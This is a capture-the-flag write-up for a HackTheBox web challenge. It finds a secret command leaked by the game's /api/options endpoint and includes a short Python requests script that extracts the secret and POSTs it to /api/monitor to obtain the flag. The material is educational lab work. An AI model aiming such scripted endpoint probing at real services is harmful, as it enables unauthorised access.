# Flag Command - HTB Challenge Writeup
## Reconnaissance / Information Gathering
We first receive the Host information: `83.136.255.10:55943`

![image](https://github.com/user-attachments/assets/53a152be-5c0a-4f96-89bd-f4bc7efbc55c)


Putting this in our web browser, we are faced with a website that is telling a story about being in a alien forest. We are prompted to type 'start' to start our adventure:

![image](https://github.com/user-attachments/assets/62294dbc-1a3f-48b3-a588-9aa4ac008721)

Going through the adventure with the available adventure options, we die and have to start again:
![image](https://github.com/user-attachments/assets/15f0d537-80de-459c-8615-7aa3a96ba5fe)

We can view the main script for the game in the source code. Here we can find if the game displays 'HTB{', then we win the game:
![Pasted image 20250502074403](Screenshots/Pasted%20image%2020250502074403.png)

When trying to put in other JavaScript commands, we are told we can't use other commands, and we must choose from the available options (which are displayed using the command 'help'):
![image](https://github.com/user-attachments/assets/eeeb825e-57d4-40bf-a881-794b9be9a769)


We can view the main script for the game in the source code. Here we can find if the game displays 'HTB{', then we win the game:
![image](https://github.com/user-attachments/assets/37d55b62-5241-41a1-a978-39fdcd169813)


When trying to put in other JavaScript commands, we are told we can't use other commands, and we must choose from the available options (which are displayed using the command 'help'):
![image](https://github.com/user-attachments/assets/eeeb825e-57d4-40bf-a881-794b9be9a769)

Exploring different avenues, we can find a GET request being sent to '/api/options' in the Network tab of our developer's tool:
![image](https://github.com/user-attachments/assets/8aebd1df-a675-4341-8e87-d8167b18f7d9)


Going to this destination, we can find all the command options for when we start the game. At the bottom, we see the secret value:
![image](https://github.com/user-attachments/assets/702600ad-1d6c-4e50-98f9-c48ea767117b)

Secret: `Blip-blop, in a pickle with a hiccup! Shmiggity-shmack`

## Exploitation
We can start the game with 'start', then enter the 'secret' value into the command-line to get the flag:
![image](https://github.com/user-attachments/assets/82634a97-1d43-4772-9ac4-5e560e245ee8)


# Automation with Python
We can write the following script to automate the process of retrieving the secret value, starting the game, and importing the secret command and exporting the flag:
```python
import requests

# Set target base URL and start a session
base_url = 'http://83.136.255.10:55943'

# Creat an HTTP session with requests library
session = requests.Session()

# Load the main page (initialize session)
session.get(base_url)

# Fetch available command options
options_url = f"{base_url}/api/options"
response = session.get(options_url)
data = response.json()

# Extract the secret command from the response
secret = data['allPossibleCommands']['secret'][0]
print(f"Secret command: {secret}")

# Prepare and send the secret command to the server
command_url = f"{base_url}/api/monitor"
headers = {
  "Content-Type": "application/json",
  "Origin": base_url,
  "Referer": base_url + "/"
}
payload = {"command": secret}
response = session.post(command_url, json=payload, headers=headers)

# Extract and print the flag from the response
print("[+] Response from server:")
flag = response.text
flag_start = flag.find("HTB{")
flag_end = flag.find("}", flag_start) + 1
flag = flag[flag_start:flag_end]
print(flag)
```
- First we utilize the `requests` library to send HTTP requests in python
- Then we capture the data from `/api/options` and extract the secret
- We then send a request to the receiving endpoint `/api/monitor` with the necessary headers, as well as our JSON payload
- Lastly, we extract the response from the server and filter out the flag to only respond with the value of the flag

Running the script we get the following:
![image](https://github.com/user-attachments/assets/fb692b67-56a1-41e6-bc1d-ac9a74ebdad6)